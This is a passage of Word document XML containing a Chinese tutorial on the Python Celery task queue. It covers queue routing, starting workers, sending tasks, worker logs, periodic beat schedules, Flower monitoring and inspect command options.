      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行消息读写的通道；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB8F68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Bind:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>绑定了</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Queue</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Exchange</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，意即为符合什么样路由规则的消息，将会放置入哪一个消息队列；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED56F5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我将</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>deal1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个函数任务放在了一个叫做</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>for_task1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的队列里面，将</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>deal2</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个函数任务放在了一个叫做</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>for_task2</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的队列里面，然后我在当前应用目录下执行命令：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1CD9C3"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celery -A app1.app1_app worker -l info -Q for_task1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DAC53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这个</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就只负责处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>for_task1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个队列的任务，这是通过在启动</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是使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-Q Queue_Name</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数指定的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CC8B6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我们定义任务调用文件</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>start_task.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0BA4C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__future__ import print_function</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBD94B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from app1.app1_app import app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFF7804"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if __name__=="__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AC0021"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for i in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8DC130"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text = 'text'+str(i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C39280D"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app.send_task('app1.tasks1.deal1',args=[text])   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务的名称必须和</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>注册的任务名称相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C25DDA"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app.send_task('app1.tasks2.deal2',args=[text])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务的名称必须和</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>注册的任务名称相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26975A06" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00A75DA0" w:rsidRDefault="00E00B91" w:rsidP="00A75DA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A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">        print('push over %d'%i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17656C4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执行上述代码文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F6A573"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python start_task.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1935EA39"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务已经被执行，我在</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>worker</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>控制台查看结果（只有</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1.appa_app.deal1</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务被这个</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>worker</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行了）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44673E16"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lastRenderedPageBreak/>
        <w:t>[2018-09-24 22:26:38,928: INFO/ForkPoolWorker-8] Task app1.tasks1.deal1[b3007993-9bfb-4161-b5b2-4f0f022f2f8b] succeeded in 0.0008255800021288451s: 'text4======='</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C5A05E"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[2018-09-24 22:26:38,928: INFO/ForkPoolWorker-6] Task app1.tasks1.deal1[df24b991-88fc-4253-86bf-540754c62da9] succeeded in 0.004320767002354842s: 'text3======='</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A60FD7"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[2018-09-24 22:26:38,929: INFO/MainProcess] Received task: app1.tasks1.deal1[dbdf9ac0-ea27-4455-90d2-e4fe8f3e895e]  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BA6ED8"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[2018-09-24 22:26:38,930: WARNING/ForkPoolWorker-4] text5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3B0FBD"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[2018-09-24 22:26:38,931: INFO/ForkPoolWorker-4] Task app1.tasks1.deal1[dbdf9ac0-ea27-4455-90d2-e4fe8f3e895e] succeeded in 0.0006721289973938838s: 'text5======='</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D7932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可以看到</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收到任务，并且执行了任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14347883"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Scheduler ( </w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>定时任务，周期性任务</w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C00086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在这里我们还是在交互模式下手动去执行，我们想要</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>crontab</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的定时生成和执行，我们可以用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beat</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>去周期的生成任务和执行任务，在这个例子中我希望每</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>秒钟产生一个任务，然后去执行这个任务，我可以这样配置（在</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1_config.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件中添加如下内容）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684FA7A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设计周期任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DF3650"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CELERY_TIMEZONE = 'Asia/Shanghai'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58337EF1"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from celery.schedules import crontab   # </w:t>
      </w:r>
      <w:r w:rsidRPr="003A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A99C243"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from datetime import timedelta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BE4E9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每隔</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>秒执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1.tasks1.deal</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD9F749"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CELERYBEAT_SCHEDULE = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F06BBD"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'deal-every-30-seconds': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5061D853"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'task': 'app1.tasks1.deal1',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B4B780"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'schedule': timedelta(seconds=30),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F0910D"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'args': ['hello']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF97A9D"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E1992D"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'deal-every-10-seconds': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BE1967"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'task': 'app1.tasks2.deal2',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E17E40"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'schedule': timedelta(seconds=10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B54494"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'args': ['hello']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3514A7C0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74743D40"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 Executes every Monday morning at 7:30 A.M</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5EAB8D"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'deal-every-monday-morning': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE7F7E6"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'task': 'app1.tasks2.deal2',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1DE475"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'schedule': crontab(hour=7, minute=30, day_of_week=1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D2354C"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'args': ['hello']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46536173"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 xml:space="preserve">    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CE6581"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1418A87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lastRenderedPageBreak/>
        <w:t>使用了</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>scheduler</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，要制定时区：</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CELERY_TIMEZONE = ‘Asia/Shanghai’</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，启动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加上</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-B</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11044D6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 -A app1.app1_app worker -l info -B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D193BC8"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前两个任务为周期任务，第三个任务为定时任务，指定时间点开始执行分发任务，让</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取走执行，可以这样配置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1754A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看完这些基础的东西，我回过头对</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在回顾了一下，用图把它的框架大致画出来，如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261855C7" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00B227A8" w:rsidRDefault="00E00B91" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="225" w:after="225"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37B487A7" wp14:editId="23C4EC55">
            <wp:extent cx="6356111" cy="3424989"/>
            <wp:effectExtent l="0" t="0" r="698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15371" cy="3456921"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9F808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任务调度的配置项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181338C1" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="003A3680" w:rsidRDefault="00E00B91" w:rsidP="003A3680">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A3680">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://docs.celeryproject.org/en/latest/userguide/configuration.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3474F8F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celery </w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务监控</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067EEB3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 flower</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E11DF77" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00B227A8" w:rsidRDefault="00E00B91" w:rsidP="003A3680">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="225" w:after="225"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54AB4A7A" wp14:editId="4A54FCBE">
            <wp:extent cx="8862060" cy="15468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862833" cy="1546995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB6AD34" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00957381"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 xml:space="preserve">celery </w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>控制命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611F569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w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4AC41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celery [Global Options] inspect [command] [Remote Control Options]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715268C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018A3E6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Global Options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F890AE7"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-A APP, --app APP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377401B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-b BROKER, --broker BROKER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78724E29"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--result-backend RESULT_BACKEND</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542D757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--loader LOADER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F00A97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--config CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0771A2B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--workdir WORKDIR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7BAC08"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--no-color, -C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C83842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--quiet, -q</w:t>
      </w:r>
    </w:p>
